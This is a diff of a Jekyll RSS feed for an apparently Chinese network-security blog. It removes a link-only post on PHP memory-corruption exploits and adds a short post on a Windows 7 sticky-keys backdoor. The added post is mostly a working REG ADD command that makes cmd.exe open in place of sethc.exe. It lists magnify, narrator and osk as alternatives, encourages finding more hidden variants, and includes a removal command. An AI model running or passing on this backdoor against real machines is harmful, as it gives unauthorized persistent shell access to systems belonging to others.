@@ -5,9 +5,47 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 02 Aug 2017 07:49:49 +0800</pubDate>
-    <lastBuildDate>Wed, 02 Aug 2017 07:49:49 +0800</lastBuildDate>
+    <pubDate>Thu, 03 Aug 2017 21:48:04 +0800</pubDate>
+    <lastBuildDate>Thu, 03 Aug 2017 21:48:04 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>win7粘滞键后门</title>
+        <description>&lt;p&gt;以管理员身份打开cmd.exe运行如下:&lt;/p&gt;
+
+&lt;p&gt;’’’
+REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe” /v Debugger /t REG_SZ /d “C:\windows\system32\cmd.exe”
+‘’’&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe&lt;/td&gt;
+      &lt;td&gt;osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥:&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://answers.microsoft.com/en-us/windows/forum/windows_7-performance/run-command/a2632e97-c8d1-4ab3-8df2-7e70a4448267&quot;&gt;AsULike&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;删除后门以管理员身份打开cmd.exe运行如下即可:&lt;/p&gt;
+
+&lt;p&gt;’’’
+REG DELETE “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe”
+‘’’&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Aug 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</guid>
+        
+        <category>后门</category>
+        
+        <category>win7</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>xlearn</title>
@@ -979,29 +1017,6 @@ https://mp.weixin.qq.com/s/ij4olS8GrYr7L-4LFGpQxg
         
         
         <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>PHP中的内存破坏漏洞利用学习(2nd)</title>
-        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;学习乌云中的&amp;lt;&amp;lt;PHP中的内存破坏漏洞利用&amp;gt;&amp;gt;
-link:http://cb.drops.wiki/drops/tips-4988.html
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Mon, 15 May 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/05/15/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(2nd)/</link>
-        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/05/15/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(2nd)/</guid>
-        
-        <category>php</category>
-        
-        <category>内存破坏</category>
-        
-        
-        <category>二进制</category>
         
       </item>
     
